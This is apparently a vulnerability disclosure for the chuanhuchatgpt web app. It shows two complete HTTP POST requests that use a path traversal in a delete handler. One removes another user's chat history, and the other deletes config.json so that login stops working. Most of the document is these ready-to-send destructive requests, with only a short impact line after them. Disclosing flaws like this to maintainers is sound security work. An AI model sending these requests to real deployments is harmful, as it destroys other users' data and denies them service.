Title: Deleting Other User's Chat History in gaizhenbiao/chuanhuchatgpt

Proof of Concept: 
Deleting chats

An attacker can very simply send the following request to delete other user's chats via a path traversal

POST /queue/join? HTTP/1.1
Host: 127.0.0.1:7860
Cookie: access-token-Am86qIikSe34XMu5FQqcu0jasA_03gF2Wy8qA0pI5u4=f-Jm7TzZPwosPrsxQvaXfw; access-token-unsecure-Am86qIikSe34XMu5FQqcu0jasA_03gF2Wy8qA0pI5u4=f-Jm7TzZPwosPrsxQvaXfw;
Content-Length: 118

{"data":[null,"history/pink/pink",null],"event_data":null,"fn_index":38,"trigger_id":29,"session_hash":"imzrkogx1n"}

Note the string history/pink/pink. This deletes the chat named pink for the user pink. An attacker can change this string to delete any chats.

Deleting config.json, causing a denial of service

An attacker can very simply send the following request to delete the config.json file.

POST /queue/join? HTTP/1.1
Host: 127.0.0.1:7860
Cookie: access-token-Am86qIikSe34XMu5FQqcu0jasA_03gF2Wy8qA0pI5u4=f-Jm7TzZPwosPrsxQvaXfw; access-token-unsecure-Am86qIikSe34XMu5FQqcu0jasA_03gF2Wy8qA0pI5u4=f-Jm7TzZPwosPrsxQvaXfw;
Content-Length: 118

{"data":[null,"config",null],"event_data":null,"fn_index":38,"trigger_id":29,"session_hash":"imzrkogx1n"}

If you now attempt to authenticate with the service, you will notice that it's not possible, since credentials are read from the config, which has now been removed.

Impact: 
This vulnerability leads to the loss of data, as well as to a denial of service.
